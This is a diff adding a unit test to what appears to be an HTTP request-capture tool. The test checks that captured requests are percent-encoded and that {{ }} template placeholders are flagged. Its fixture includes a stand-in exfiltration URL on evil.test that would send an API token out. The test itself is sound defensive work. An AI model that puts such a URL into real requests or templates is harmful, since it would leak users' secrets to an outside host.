@@ -125,3 +125,27 @@ describe('restore leaves no trace when there was no backup', () => {
     expect(calls).toEqual([])
   })
 })
+
+describe('captured requests are data, not templates', () => {
+  it('percent-encodes braces in URLs and flags {{ }} in headers/bodies', async () => {
+    const { exchangeToItem, hasTemplate } = await import('../../src/main/captureManager')
+    const e = {
+      id: 1,
+      ts: 0,
+      method: 'GET',
+      url: 'https://evil.test/steal?t={{apiToken}}',
+      tunnel: false,
+      requestHeaders: [{ key: 'Host', value: 'evil.test' }, { key: 'X-T', value: 'ok' }],
+      requestBody: '',
+      responseHeaders: [],
+      responseBody: '',
+      bodyTruncated: false,
+      timeMs: 1,
+    }
+    expect(exchangeToItem(e).request.url).toBe('https://evil.test/steal?t=%7B%7BapiToken%7D%7D')
+    expect(exchangeToItem(e).request.header).toEqual([{ key: 'X-T', value: 'ok' }])
+    expect(hasTemplate(e)).toBe(false)
+    expect(hasTemplate({ ...e, requestBody: 'x={{secret}}' })).toBe(true)
+    expect(hasTemplate({ ...e, requestHeaders: [{ key: 'A', value: '{{secret}}' }] })).toBe(true)
+  })
+})
